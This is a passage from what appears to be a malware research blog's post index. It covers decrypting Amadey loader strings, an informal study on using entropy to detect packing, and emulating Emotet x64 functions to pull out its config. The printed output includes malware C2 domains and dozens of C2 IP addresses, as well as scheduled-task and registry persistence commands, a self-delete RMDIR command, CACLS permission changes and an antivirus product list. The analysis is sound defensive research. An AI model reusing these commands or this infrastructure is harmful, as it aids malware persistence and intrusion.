is_ascii = lambda s: re.match(b&#39;^[ s!-~]+$&#39;, s) def validate_key(keys, strings): canary_str = max(strings, key=len) for key in keys: if is_ascii(decrypt_string(canary_str, key)): return key return None def decrypt_strings(data): out = [] enc_strings = get_strings() keys = get_keys() key = validate_key(keys, enc_strings) if key is not None: for s in enc_strings: out.append(decrypt_string(s, key)) return out strings = decrypt_strings(data) for s in strings: print(s) . b&#39;happyday9risce.com&#39; b&#39;/gg4mn3s/index.php&#39; b&#39;xksldjf9sksdjfks.com&#39; b&#39;dhisa8f9ah02hopasiaf.com&#39; b&#39;3.20&#39; b&#39;a10b8dfb5f&#39; b&#39;orxds.exe&#39; b&#39;SCHTASKS&#39; b&#39;/Create /SC MINUTE /MO 1 /TN &#39; b&#39; /TR &#34;&#39; b&#39;&#34; /F&#39; b&#39;/C REG ADD &#34;HKCU Software Microsoft Windows CurrentVersion Explorer User Shell Folders&#34; /f /v Startup /t REG_SZ /d &#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion Explorer Shell Folders&#39; b&#39;Startup&#39; b&#39;/C REG ADD &#34;HKCU SOFTWARE Microsoft Windows CurrentVersion RunOnce&#34; /f /v rem /t REG_SZ /d &#39; b&#39;&#34;cmd /C RMDIR /s/q &#34;&#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion Run&#39; b&#39;rundll32 &#39; b&#39; /Delete /TN &#34;&#39; b&#39;powershell&#39; b&#34;-Command $action = New-ScheduledTaskAction -Execute &#39;&#34; b&#34;&#39;; $time = New-TimeSpan -Minutes 1; $trigger = New-ScheduledTaskTrigger -Once -At 0:00 -RepetitionInterval $time; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName &#39;&#34; b&#34;-Command $action = Unregister-ScheduledTask -TaskName &#39;&#34; b&#39;-Confirm: $false&#39; b&#39;POST&#39; b&#39;&amp;vs=&#39; b&#39;&amp;sd=&#39; b&#39;&amp;os=&#39; b&#39;&amp;bi=&#39; b&#39;&amp;ar=&#39; b&#39;&amp;pc=&#39; b&#39;&amp;un=&#39; b&#39;&amp;dm=&#39; b&#39;&amp;av=&#39; b&#39;&amp;lv=&#39; b&#39;cred.dll|&#39; b&#39;Main&#39; b&#39;http://&#39; b&#39;https://&#39; b&#39;Plugins/&#39; b&#39;&amp;unit=&#39; b&#39;shell32.dll&#39; b&#39;kernel32.dll&#39; b&#39;GetNativeSystemInfo&#39; b&#39;ProgramData &#39; b&#39;AVAST Software&#39; b&#39;Avira&#39; b&#39;Kaspersky Lab&#39; b&#39;ESET&#39; b&#39;Panda Security&#39; b&#39;Doctor Web&#39; b&#39;360TotalSecurity&#39; b&#39;Bitdefender&#39; b&#39;Norton&#39; b&#39;Sophos&#39; b&#39;Comodo&#39; b&#39;WinDefender&#39; b&#39;0123456789&#39; b&#39;Content-Type: multipart/form-data; boundary=-&#39; b&#39;&#39; b&#39; r nContent-Disposition: form-data; name=&#34;data&#34;; filename=&#34;&#39; b&#39;&#34; r nContent-Type: application/octet-stream r n r n&#39; b&#39; r n&#39; b&#39;-- r n&#39; b&#39;?scr=1&#39; b&#39;.jpg&#39; b&#39;Content-Type: application/x-www-form-urlencoded&#39; b&#39;SYSTEM CurrentControlSet Control ComputerName ComputerName&#39; b&#39;ComputerName&#39; b&#39;abcdefghijklmnopqrstuvxyz0123456789-_&#39; b&#39;-unicode-&#39; b&#39;SYSTEM CurrentControlSet Control UnitedVideo CONTROL VIDEO &#39; b&#39;SYSTEM ControlSet001 Services BasicDisplay Video&#39; b&#39;VideoID&#39; b&#39; 0000&#39; b&#39;DefaultSettings.XResolution&#39; b&#39;DefaultSettings.YResolution&#39; b&#39;SOFTWARE Microsoft Windows NT CurrentVersion&#39; b&#39;ProductName&#39; b&#39;2019&#39; b&#39;2022&#39; b&#39;2016&#39; b&#39;CurrentBuild&#39; b&#39;cmd.exe&#39; b&#39;/c echo Y|CACLS &#34;&#39; b&#39;&#34; /P &#34;&#39; b&#39;/c CACLS &#34;&#39; b&#39;:R&#34; /E&#39; b&#39;:F&#34; /E&#39; b&#39;AppData&#39; b&#39;rundll32.exe&#39; .",
            "url": "https://research.openanalysis.net/triage/malware/amadey/loader/config/2022/05/29/traige-amadey-loader.html",
            "relUrl": "/triage/malware/amadey/loader/config/2022/05/29/traige-amadey-loader.html",
            "date": " • May 29, 2022"
        }
        
    
  
    
        ,"post6": {
            "title": "Does Entropy Matter? A Pseudoscientific Study!",
            "content": "Overview . Entroy is obviously useful and tells us information about the binary. However, can we use entropy alone to determine if a sample is packed or not. Let&#39;s define the parameters for our study. . Without looking at the binary in IDA (or your RE tool of choice) can you use entropy to determine if the sample is packed? | We are defining &quot;packed&quot; as a file that contains an encrypted, or compressed payload, where our analysis goals are to analyze the payload and not the packer. | Are there specific data in the binary that can be tested for entopy that will give use a better answer than testing the full binary? For example, looking at the entropy of sections, or of resources. | . References . Understanding Shannon&#39;s Entropy metric for Information | Using entropy to spot the malware hiding in plain sight | merces/entropy (github) | PowerShellArsenal/Misc/Get-Entropy.ps1 | Using Entropy Analysis to Find Encrypted and Packed Malware (bintropy) | bintropy (github) | Packer Detection for Multi-Layer Executables Using Entropy Analysis | Generic unpacking using entropy analysis | . Our Problem . Based on entropy can we make a decision about whether or not to open a sample in IDA by looking at entropy alone. If we cannot make this decision we will have to open the binary in IDA so why bother looking at entropy at all? . Our Study . For our study we are going to collect a set of known packed, and unpacked (payload) samples to use as our ground truth. We will then run differnt types of entropy calculation on the binaries and look for a common cutoff where we could made a decision that the samples are packed/unpacked. If the cutoff is such that we cannot classify all samples within an error margin of ERROR-RATE-TBD then we can conclude that entropy will not consistantly answer our problem statement. . Tools . We are going to use bintropy and the standard section entropy calculation from pefile as our two tools. . import pefile import bintropy def pe_test(file_path, all_sections=True): # # We will test the entropy of the non-executable sections # and return the largest entropy value # pe = pefile.PE(file_path) entropy_list = [] for s in pe.sections: if all_sections: entropy_list.append(s.get_entropy()) elif not s.IMAGE_SCN_CNT_CODE: entropy_list.append(s.get_entropy()) if len(entropy_list) == 0: return 0 return max(entropy_list) def is_dotnet(file_path): pe = pefile.PE(file_path) isDotNet = pe.OPTIONAL_HEADER.DATA_DIRECTORY[14] if isDotNet.VirtualAddress == 0 and isDotNet.Size == 0: return False else: return True def bintropy_test(file_path, get_average=True): h_e, av_e = bintropy.bintropy(file_path, decide=False) if get_average: return av_e else: return h_e . UNPACKED_DIR = &#39;/tmp/unpacked&#39; PACKED_DIR = &#39;/tmp/packed&#39; file_path = &#39;/tmp/packed/ff5ac0eb80d90c6a2a46a4133fc8d90cd165b8b2bac1cbaa8fadd35b186bd5c8.bin&#39; # # threshold avg packed 6.677 # threshold highest packed 7.199 # # test all sections print(&quot; ntesting all sections&quot;) pe = pefile.PE(file_path) for s in pe.sections: print(f&quot; is code: {s.IMAGE_SCN_CNT_CODE} -- {s.get_entropy()}&quot;) # test the pe method only data print(&quot; ntest highest entropy from data sections&quot;) print(pe_test(file_path, all_sections=False)) # test the pe method all sections print(&quot; ntest highest entropy from all sections&quot;) print(pe_test(file_path, all_sections=True)) # test bintropy average print(&quot; ntest bintropy average&quot;) print(bintropy_test(file_path, get_average=True)) # test bintropy average print(&quot; ntest bintropy highest&quot;) print(bintropy_test(file_path, get_average=False)) . testing all sections is code: True -- 7.6981527898958 is code: False -- 5.395082466102808 is code: False -- 2.3168484674576013 is code: False -- 0.020393135236084953 is code: False -- 4.823677517350269 test highest entropy from data sections 5.395082466102808 test highest entropy from all sections 7.6981527898958 test bintropy average 6.267216812715635 test bintropy highest 7.796875 . First Test of All Methods . import os from rich.console import Console from rich.table import Table # assign directory directory = PACKED_DIR # iterate over files in # that directory table = Table(title=&quot;Packed Samples&quot;, expand=True) table.add_column(&quot;file&quot;, justify=&quot;center&quot;, no_wrap=True, ) table.add_column(&quot;.NET&quot;, justify=&quot;center&quot;, no_wrap=True, ) table.add_column(&quot;pe data&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;pe all&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;pe all npacked @ 7&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin ave&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin all&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin all npacked @ 7&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin t/f&quot;, justify=&quot;center&quot;, no_wrap=True) for filename in os.listdir(directory): f = os.path.join(directory, filename) # checking if it is a file if os.path.isfile(f): file_path = f pe_data = pe_test(file_path, all_sections=False) pe_all = pe_test(file_path, all_sections=True) bin_ave = bintropy_test(file_path, get_average=True) bin_all = bintropy_test(file_path, get_average=False) bin_tf = bintropy.bintropy(file_path) dotnet = is_dotnet(file_path) table.add_row(filename[:5], str(dotnet), str(pe_data)[:4], str(pe_all)[:4], str(True if pe_all &gt; 7 else False), str(bin_ave)[:4], str(bin_all)[:4], str(True if bin_all &gt; 7 else False), str(bin_tf)) console = Console() console.print(table) . Packed Samples ┏━━━━━━━━┳━━━━━━━┳━━━━━━━━━┳━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━┓ ┃ ┃ ┃ ┃ ┃ pe all ┃ ┃ ┃ bin all ┃ ┃ ┃ file ┃ .NET ┃ pe data ┃ pe all ┃ packed @ 7 ┃ bin ave ┃ bin all ┃ packed @ 7 ┃ bin t/f ┃ ┡━━━━━━━━╇━━━━━━━╇━━━━━━━━━╇━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━┩ │ 5b39d │ True │ 3.46 │ 7.85 │ True │ 6.82 │ 7.31 │ True │ True │ │ 2d83e │ False │ 7.98 │ 7.98 │ True │ 6.87 │ 7.34 │ True │ True │ │ 54fa2 │ False │ 2.85 │ 7.95 │ True │ 6.86 │ 7.28 │ True │ True │ │ eca1c │ False │ 7.89 │ 7.89 │ True │ 6.07 │ 7.30 │ True │ False │ │ 8cb98 │ False │ 0.0 │ 7.99 │ True │ 6.86 │ 7.31 │ True │ True │ │ f2354 │ True │ 4.22 │ 7.81 │ True │ 6.77 │ 7.29 │ True │ True │ │ b9aba │ False │ 7.17 │ 7.17 │ True │ 6.14 │ 7.01 │ True │ False │ │ d5c2e │ True │ 2.65 │ 7.85 │ True │ 6.28 │ 7.31 │ True │ False │ │ 3493e │ True │ 3.70 │ 6.21 │ False │ 3.92 │ 7.27 │ True │ False │ │ 23b04 │ False │ 5.93 │ 6.55 │ False │ 5.36 │ 6.91 │ False │ False │ │ 080f1 │ False │ 5.52 │ 7.46 │ True │ 5.89 │ 7.79 │ True │ False │ │ a7084 │ True │ 4.10 │ 7.86 │ True │ 6.84 │ 7.31 │ True │ True │ │ 60d89 │ False │ 5.25 │ 7.77 │ True │ 5.71 │ 7.32 │ True │ False │ │ 35196 │ False │ 7.25 │ 7.25 │ True │ 5.44 │ 7.38 │ True │ False │ │ ff5ac │ False │ 5.39 │ 7.69 │ True │ 6.26 │ 7.79 │ True │ False │ │ 3664a │ True │ 4.51 │ 4.51 │ False │ 4.20 │ 5.32 │ False │ False │ │ 0d333 │ False │ 7.99 │ 7.99 │ True │ 6.50 │ 7.45 │ True │ False │ │ 35196 │ False │ 7.25 │ 7.25 │ True │ 5.44 │ 7.38 │ True │ False │ │ 31323 │ False │ 0 │ 7.99 │ True │ 7.13 │ 7.32 │ True │ True │ │ 44824 │ False │ 7.74 │ 7.74 │ True │ 5.80 │ 7.79 │ True │ False │ │ 3d4f0 │ True │ 6.51 │ 7.86 │ True │ 6.79 │ 7.30 │ True │ True │ │ b707d │ False │ 0.0 │ 6.45 │ False │ 5.37 │ 7.42 │ True │ False │ │ 6966f │ False │ 7.12 │ 7.12 │ True │ 5.41 │ 7.36 │ True │ False │ │ 5139a │ True │ 2.39 │ 7.87 │ True │ 6.82 │ 7.35 │ True │ True │ │ 6e6e5 │ True │ 7.71 │ 7.94 │ True │ 6.83 │ 7.33 │ True │ True │ │ 0e4f3 │ False │ 7.80 │ 7.80 │ True │ 6.01 │ 7.79 │ True │ False │ └────────┴───────┴─────────┴────────┴────────────┴─────────┴─────────┴────────────┴─────────┘ . import os from rich.console import Console from rich.table import Table # assign directory directory = UNPACKED_DIR # iterate over files in # that directory table = Table(title=&quot;Unpacked Samples&quot;, expand=True) table.add_column(&quot;file&quot;, justify=&quot;center&quot;, no_wrap=True, ) table.add_column(&quot;.NET&quot;, justify=&quot;center&quot;, no_wrap=True, ) table.add_column(&quot;pe data&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;pe all&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;pe all npacked @ 7&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin ave&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin all&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin all npacked @ 7&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin t/f&quot;, justify=&quot;center&quot;, no_wrap=True) for filename in os.listdir(directory): f = os.path.join(directory, filename) # checking if it is a file if os.path.isfile(f): file_path = f pe_data = pe_test(file_path, all_sections=False) pe_all = pe_test(file_path, all_sections=True) bin_ave = bintropy_test(file_path, get_average=True) bin_all = bintropy_test(file_path, get_average=False) bin_tf = bintropy.bintropy(file_path) dotnet = is_dotnet(file_path) table.add_row(filename[:5], str(dotnet), str(pe_data)[:4], str(pe_all)[:4], str(True if pe_all &gt; 7 else False) , str(bin_ave)[:4], str(bin_all)[:4], str(True if bin_all &gt; 7 else False) , str(bin_tf)) console = Console() console.print(table) . Unpacked Samples ┏━━━━━━━━┳━━━━━━━┳━━━━━━━━━┳━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━┓ ┃ ┃ ┃ ┃ ┃ pe all ┃ ┃ ┃ bin all ┃ ┃ ┃ file ┃ .NET ┃ pe data ┃ pe all ┃ packed @ 7 ┃ bin ave ┃ bin all ┃ packed @ 7 ┃ bin t/f ┃ ┡━━━━━━━━╇━━━━━━━╇━━━━━━━━━╇━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━┩ │ cf5f9 │ True │ 3.51 │ 5.65 │ False │ 4.51 │ 5.37 │ False │ False │ │ 1b88e │ False │ 0 │ 7.40 │ True │ 6.15 │ 7.31 │ True │ False │ │ 2333c │ False │ 6.69 │ 6.69 │ False │ 5.28 │ 6.34 │ False │ False │ │ 7b277 │ True │ 0.00 │ 1.81 │ False │ 6.04 │ 7.30 │ True │ False │ │ 2b3d3 │ False │ 5.04 │ 6.18 │ False │ 5.06 │ 6.15 │ False │ False │ │ 967bd │ False │ 7.87 │ 7.87 │ True │ 5.65 │ 7.32 │ True │ False │ │ 931a0 │ False │ 7.87 │ 7.87 │ True │ 5.65 │ 7.32 │ True │ False │ │ 72f63 │ False │ 4.65 │ 6.59 │ False │ 5.55 │ 7.11 │ True │ False │ │ ee75b │ False │ 6.59 │ 6.62 │ False │ 5.43 │ 7.79 │ True │ False │ │ 65be9 │ False │ 3.69 │ 5.20 │ False │ 4.73 │ 5.22 │ False │ False │ │ 0f001 │ False │ 6.52 │ 6.70 │ False │ 5.26 │ 7.79 │ True │ False │ │ dc305 │ False │ 1.26 │ 5.73 │ False │ 5.58 │ 7.07 │ True │ False │ │ 82c44 │ False │ 0 │ 7.55 │ True │ 5.02 │ 7.32 │ True │ False │ │ 1d69f │ False │ 4.41 │ 6.58 │ False │ 5.52 │ 6.98 │ False │ False │ │ 75bae │ False │ 6.45 │ 6.45 │ False │ 5.12 │ 7.27 │ True │ False │ │ e8ad8 │ False │ 0 │ 7.27 │ True │ 6.03 │ 7.32 │ True │ False │ │ 6057d │ False │ 5.05 │ 5.99 │ False │ 5.07 │ 5.86 │ False │ False │ │ ed6eb │ True │ 7.99 │ 7.99 │ True │ 5.98 │ 7.31 │ True │ False │ │ 967bd │ False │ 7.87 │ 7.87 │ True │ 5.65 │ 7.32 │ True │ False │ │ 443bb │ False │ 6.58 │ 6.58 │ False │ 4.43 │ 7.71 │ True │ False │ │ 4076a │ True │ 4.88 │ 5.52 │ False │ 4.22 │ 5.65 │ False │ False │ │ f1c92 │ False │ 7.52 │ 7.52 │ True │ 5.69 │ 7.30 │ True │ False │ │ 0a5cd │ False │ 6.65 │ 6.65 │ False │ 5.40 │ 7.79 │ True │ False │ │ 0ffc3 │ False │ 0 │ 7.41 │ True │ 6.15 │ 7.32 │ True │ False │ │ 31a4d │ False │ 6.60 │ 6.60 │ False │ 4.42 │ 7.49 │ True │ False │ └────────┴───────┴─────────┴────────┴────────────┴─────────┴─────────┴────────────┴─────────┘ . Conclusions . Entropy May Not Be Useful for .NET . For .NET in atleast one sample 3664a0db89a9f1a8bf439d8117943d3e042abe488a761dc6c8e18b90d6081298 which was packed had an entropy in the 4 range but when unpacked 2333c19020f6e928198cea31c05dd685055991c921f3a1cd32ad9817b6c704e6 the entropy was in the 6 range. From this we can conclude that entropy may have no relation to the packed status of a .NET binary. . Bintropy Has A Poor Packed Detection Rate with Default Values . For detecting packed samples using the default threashold the failure rate was 16/26, however there were no unpacked false positives. One conclusion we can draw from this is that the tool can the relied on when it detects a packed sample (ie, the sample is probably packed) but it cannot be relied on for a decision, as it has a high false negative rate. This could be used as a filter, but not as a decision metric. . General Conclusions . The results from our small &quot;pseudoscientific&quot; study do not match the results from the two academic papers refernced in our overview (99% and 97% accuracy). In our study we had a high fidelity when detecting packed sample (ie. if it was detected as packed it was in fact packed) however, we also have very high false negative rates (ie. if it was detected as not-packed there was an over 50% chance that it was actually packed). From this we can draw two conclusions, obviously the first, this was not a scientific study (more data needed) and the second, we cannot use entropy alone for packer identification, it must be combined with other metrics. .",
            "url": "https://research.openanalysis.net/research/entropy/unpacking/malware/2022/05/26/does-entropy-matter.html",
            "relUrl": "/research/entropy/unpacking/malware/2022/05/26/does-entropy-matter.html",
            "date": " • May 26, 2022"
        }
        
    
  
    
        ,"post7": {
            "title": "Emotet x64 Stack Strings Config Emulation",
            "content": "Overview . The week of May 9th, 2022 Emotet released an update to their x64 malware that used &quot;stack strings&quot; and an obfuscator to protect the strings, keys, and c2s. This was a change from the enrypted strings and c2 tables that were usually stored at the beginning of the .text and .data sections. Our new approach for config extraction will be to identify the functions used to supply the strings and c2s and emulate them. . Samples . packed: 92033dc85730f7dc5dbd85369ea1db8806ce7581c1e9b4764a82abfc54e3146e | unpacked: c688e079a16b3345c83a285ac2ae8dd48680298085421c225680f26ceae73eb7 | . Tools . Dumpulator minidump emulation github | . Using Dumpulator Emulation . from dumpulator import Dumpulator dp = Dumpulator(&quot;/tmp/emo2.dmp&quot;, quiet=True) . fn_addr_list = [0x07FFA3BA235D0, 0x7FFA3BA213C4,0x7FFA3BA21AAC,0x7FFA3BA2400C,0x7FFA3BA282D8,0x7FFA3BA2A36C,0x7FFA3BA2D370,0x7FFA3BA2DD3C,0x7FFA3BA2E468,0x7FFA3BA30C28,0x7FFA3BA31960,0x7FFA3BA33F28,0x7FFA3BA35980,0x7FFA3BA35B04,0x7FFA3BA3AFB0,0x7FFA3BA3F9A8,0x7FFA3BA3FEE8,0x7FFA3BA4012C,0x7FFA3BA41124,0x7FFA3BA412A4,0x7FFA3BA415A0,0x7FFA3BA42224,0x7FFA3BA43224,0x7FFA3BA44AEC,0x7FFA3BA465F0,0x7FFA3BA46744,0x7FFA3BA47140,0x7FFA3BA472A8,0x7FFA3BA490F8,0x7FFA3BA49850,0x7FFA3BA49A58,0x7FFA3BA49D04,0x7FFA3BA49FB4,0x7FFA3BA4BCB4,0x7FFA3BA4C168] for fn_addr in fn_addr_list: out = dp.call(fn_addr, []) ptxt_str = dp.read_str(out, encoding=&#39;utf-16&#39;) print(f&quot;{hex(fn_addr)}: {ptxt_str}&quot;) . 0x7ffa3ba235d0: %s%s.dll 0x7ffa3ba213c4: ObjectLength 0x7ffa3ba21aac: SOFTWARE Microsoft Windows CurrentVersion Run 0x7ffa3ba2400c: WinSta0 Default 0x7ffa3ba282d8: RNG 0x7ffa3ba2a36c: AES 0x7ffa3ba2d370: %s %s 0x7ffa3ba2dd3c: %s * 0x7ffa3ba2e468: SHA256 0x7ffa3ba30c28: %s %s 0x7ffa3ba31960: urlmon.dll 0x7ffa3ba33f28: advapi32.dll 0x7ffa3ba35980: %s:Zone.Identifier 0x7ffa3ba35b04: %s%s.exe 0x7ffa3ba3afb0: %s regsvr32.exe &#34;%s %s&#34; %s 0x7ffa3ba3f9a8: HASH 0x7ffa3ba3fee8: Microsoft Primitive Provider 0x7ffa3ba4012c: bcrypt.dll 0x7ffa3ba41124: ECDH_P256 0x7ffa3ba412a4: Cookie: %s=%s 0x7ffa3ba415a0: shlwapi.dll 0x7ffa3ba42224: shell32.dll 0x7ffa3ba43224: ECCPUBLICBLOB 0x7ffa3ba44aec: Content-Type: multipart/form-data; boundary=%s 0x7ffa3ba465f0: wininet.dll 0x7ffa3ba46744: ECDSA_P256 0x7ffa3ba47140: %s %s%x 0x7ffa3ba472a8: wtsapi32.dll 0x7ffa3ba490f8: POST 0x7ffa3ba49850: %s regsvr32.exe &#34;%s&#34; %s 0x7ffa3ba49a58: %s regsvr32.exe &#34;%s %s&#34; 0x7ffa3ba49d04: userenv.dll 0x7ffa3ba49fb4: %u.%u.%u.%u 0x7ffa3ba4bcb4: crypt32.dll 0x7ffa3ba4c168: KeyDataBlob . dp.read_str(out, encoding=&#39;utf-16&#39;) . &#39;%s%s.dll&#39; . import struct key_decrypt_functions = [0x7FFA3BA33B90, 0x7FFA3BA22048] for key_decrypt_function in key_decrypt_functions: tmp_arg = dp.allocate(8) out = dp.call(key_decrypt_function, [tmp_arg,tmp_arg, tmp_arg, tmp_arg]) key_header = bytes(dp.read(out, 8)) key_len = struct.unpack(&#39;&lt;I&#39;,key_header[4:8])[0] full_key_len = 8 + 2 * key_len key = bytes(dp.read(out, full_key_len)) print(key) . b&#39;ECK1 x00 x00 x00 xf3 xa35 xb5 x0e.+ xf45V xcd nL)&gt;| xf1 x10 xdd xcb xb0O xb3 xfa x02 xceL xb6 x0c x1eD x96 xbe xb4 x0e xe6 xc9[ x9a xbdN xbd x9d x8f xcf xe0 x10[4L x82 x04&amp; x02 xd3 xba xac xf1 xfb x9f,v&#39; b&#39;ECS1 x00 x00 x00@_t xb6 xc4 xd8 xdc x0c= x1f x06z7 xdc xb9 xf9 xb7 xbd^ x8a/ xa6 xa1 xf2 x0f xa1y r x14 xe5 xf51 xe8 xb0 n x1e&lt; x8b?{ x90 x1d&amp;&amp;1 x86e| x1a xad xd9 xc3 xacH xf0` x87 x18 xd9t&lt;X xf9&#39; . c2_fns = [0x07FFA3BA2E70C, 0x7FFA3BA30D88,0x7FFA3BA4B054,0x7FFA3BA21528,0x7FFA3BA4A4CC,0x7FFA3BA4C2B8,0x7FFA3BA4BF80,0x7FFA3BA4AA74,0x7FFA3BA2DAB0,0x7FFA3BA43584,0x7FFA3BA34644,0x7FFA3BA2FD58,0x7FFA3BA35690,0x7FFA3BA3975C,0x7FFA3BA23BD0,0x7FFA3BA3519C,0x7FFA3BA2B610,0x7FFA3BA4C8B0,0x7FFA3BA3C9F8,0x7FFA3BA36A10,0x7FFA3BA4339C,0x7FFA3BA21F58,0x7FFA3BA4557C,0x7FFA3BA28BC8,0x7FFA3BA3C5B4,0x7FFA3BA45498,0x7FFA3BA21000,0x7FFA3BA24E50,0x7FFA3BA2FBC4,0x7FFA3BA33278,0x7FFA3BA468C0,0x7FFA3BA464FC,0x7FFA3BA28EE0,0x7FFA3BA274A0,0x7FFA3BA3092C,0x7FFA3BA24D58,0x7FFA3BA3E274,0x7FFA3BA2BCF8,0x7FFA3BA4CAF8,0x7FFA3BA4A340,0x7FFA3BA29820,0x7FFA3BA4A0F8,0x7FFA3BA494D8,0x7FFA3BA35C7C,0x7FFA3BA3D5C8,0x7FFA3BA21D48,0x7FFA3BA4103C,0x7FFA3BA28DCC,0x7FFA3BA22F64,0x7FFA3BA301BC,0x7FFA3BA2F454,0x7FFA3BA2B9E4,0x7FFA3BA24C38,0x7FFA3BA3CF80,0x7FFA3BA3E360,0x7FFA3BA45264,0x7FFA3BA49C14,0x7FFA3BA469D0,0x7FFA3BA281E4,0x7FFA3BA2DC28,0x7FFA3BA26F38,0x7FFA3BA45678,0x7FFA3BA24868,0x7FFA3BA35598] def get_c2_from_fn(c2_fn): c2_ip = dp.allocate(4) c2_port = dp.allocate(4) ret = dp.call(c2_fn, [c2_ip, c2_port]) c2_port_bytes = dp.read(c2_port, 4) c2_port = struct.unpack(&#39;&lt;H&#39;,c2_port_bytes[2:4])[0] c2_ip_bytes = dp.read(c2_ip, 4) c2_ip = f&quot;{c2_ip_bytes[0]}.{c2_ip_bytes[1]}.{c2_ip_bytes[2]}.{c2_ip_bytes[3]}&quot; return f&quot;{c2_ip}:{c2_port}&quot; for c2_fn in c2_fns: c2 = get_c2_from_fn(c2_fn) print(f&quot;{c2}&quot;) . 172.104.251.154:8080 209.250.246.206:443 110.232.117.186:8080 164.68.99.3:8080 119.193.124.41:7080 212.237.17.99:8080 107.182.225.142:8080 185.8.212.130:7080 153.126.146.25:7080 77.81.247.144:8080 209.126.98.206:8080 201.94.166.162:443 131.100.24.231:80 45.235.8.30:8080 213.241.20.155:443 103.43.46.182:443 0.0.0.0:0 129.232.188.93:443 103.132.242.26:8080 151.106.112.196:8080 45.118.115.99:8080 185.4.135.165:8080 103.70.28.102:8080 51.91.7.5:8080 27.54.89.58:8080 196.218.30.83:443 206.189.28.199:8080 91.207.28.33:8080 79.137.35.198:8080 51.254.140.238:7080 173.212.193.249:8080 203.114.109.124:443 94.23.45.86:4143 63.142.250.212:443 189.126.111.200:7080 160.16.142.56:8080 102.222.215.74:443 5.9.116.246:8080 158.69.222.101:443 167.172.253.162:8080 82.165.152.127:8080 212.24.98.99:8080 197.242.150.244:8080 72.15.201.15:8080 101.50.0.91:8080 51.91.76.89:8080 183.111.227.137:8080 188.44.20.25:443 58.227.42.236:80 45.176.232.124:443 185.157.82.211:8080 163.44.196.120:8080 159.65.88.10:8080 146.59.226.45:443 1.234.2.232:8080 149.56.131.28:8080 209.97.163.214:443 46.55.222.11:443 150.95.66.124:8080 103.75.201.2:443 216.158.226.206:443 134.122.66.193:8080 1.234.21.73:7080 167.99.115.35:8080 . Automated Function Identification . Now that we have a way to extract the data from the functions using emulation all we need to do is create some regexes to indetify the functions and complete our automation. . import re import struct import pefile dump_image_base = 0x7FFA3BA20000 FILE_PATH = &#39;/tmp/emo_unpacked_1020000.bin&#39; file_data = open(FILE_PATH, &#39;rb&#39;).read() pe = pefile.PE(data=file_data) egg = rb&#39; x48 x8D x05(....) x48 x89 x81.. x00 x00&#39; for m in re.finditer(egg, file_data): fn_rel_offset = struct.unpack(&#39;&lt;i&#39;, m.group(1))[0] inst_offset = m.start() fn_rva = pe.get_rva_from_offset(inst_offset) + 7 + fn_rel_offset fn_addr = dump_image_base + fn_rva c2 = get_c2_from_fn(fn_addr) print(f&quot;{hex(fn_addr)}: {c2}&quot;) . 0x7ffa3ba30d88: 209.250.246.206:443 0x7ffa3ba4b054: 110.232.117.186:8080 0x7ffa3ba21528: 164.68.99.3:8080 0x7ffa3ba4a4cc: 119.193.124.41:7080 0x7ffa3ba4c2b8: 212.237.17.99:8080 0x7ffa3ba4aa74: 185.8.212.130:7080 0x7ffa3ba2dab0: 153.126.146.25:7080 0x7ffa3ba43584: 77.81.247.144:8080 0x7ffa3ba34644: 209.126.98.206:8080 0x7ffa3ba2fd58: 201.94.166.162:443 0x7ffa3ba35690: 131.100.24.231:80 0x7ffa3ba3975c: 45.235.8.30:8080 0x7ffa3ba23bd0: 213.241.20.155:443 0x7ffa3ba3519c: 103.43.46.182:443 0x7ffa3ba2b610: 0.0.0.0:0 0x7ffa3ba4c8b0: 129.232.188.93:443 0x7ffa3ba3c9f8: 103.132.242.26:8080 0x7ffa3ba36a10: 151.106.112.196:8080 0x7ffa3ba4339c: 45.118.115.99:8080 0x7ffa3ba21f58: 185.4.135.165:8080 0x7ffa3ba4557c: 103.70.28.102:8080 0x7ffa3ba28bc8: 51.91.7.5:8080 0x7ffa3ba3c5b4: 27.54.89.58:8080 0x7ffa3ba21000: 206.189.28.199:8080 0x7ffa3ba2fbc4: 79.137.35.198:8080 0x7ffa3ba33278: 51.254.140.238:7080 0x7ffa3ba468c0: 173.212.193.249:8080 0x7ffa3ba464fc: 203.114.109.124:443 0x7ffa3ba28ee0: 94.23.45.86:4143 0x7ffa3ba3092c: 189.126.111.200:7080 0x7ffa3ba24d58: 160.16.142.56:8080 0x7ffa3ba3e274: 102.222.215.74:443 0x7ffa3ba2bcf8: 5.9.116.246:8080 0x7ffa3ba4a340: 167.172.253.162:8080 0x7ffa3ba29820: 82.165.152.127:8080 0x7ffa3ba494d8: 197.242.150.244:8080 0x7ffa3ba35c7c: 72.15.201.15:8080 0x7ffa3ba3d5c8: 101.50.0.91:8080 0x7ffa3ba21d48: 51.91.76.89:8080 0x7ffa3ba4103c: 183.111.227.137:8080 0x7ffa3ba28dcc: 188.44.20.25:443 0x7ffa3ba22f64: 58.227.42.236:80 0x7ffa3ba301bc: 45.176.232.124:443 0x7ffa3ba2b9e4: 163.44.196.120:8080 0x7ffa3ba24c38: 159.65.88.10:8080 0x7ffa3ba3cf80: 146.59.226.45:443 0x7ffa3ba3e360: 1.234.2.232:8080 0x7ffa3ba49c14: 